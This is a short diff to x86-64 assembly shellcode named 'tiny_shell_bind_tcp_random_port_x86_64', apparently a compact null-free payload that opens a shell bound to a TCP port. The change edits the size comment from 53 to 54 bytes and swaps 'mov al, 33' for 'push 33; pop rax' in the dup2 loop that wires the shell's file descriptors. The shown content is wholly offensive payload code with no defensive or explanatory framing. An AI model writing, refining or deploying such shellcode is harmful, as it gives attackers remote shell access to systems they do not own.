@@ -37,7 +37,7 @@
 
 ;   tiny_shell_bind_tcp_random_port_x86_64
 ;
-;   * 53 bytes
+;   * 54 bytes
 ;   * null-free
 ;
 ;
@@ -126,7 +126,8 @@ _start:
 dup_loop:
 	dec esi			; decrement loop counter
 
-	mov al, 33		; syscall 33 - dup2
+	push 33			; syscall 33 - dup2
+	pop rax
 	syscall			; kernel interruption
 
 	jnz dup_loop
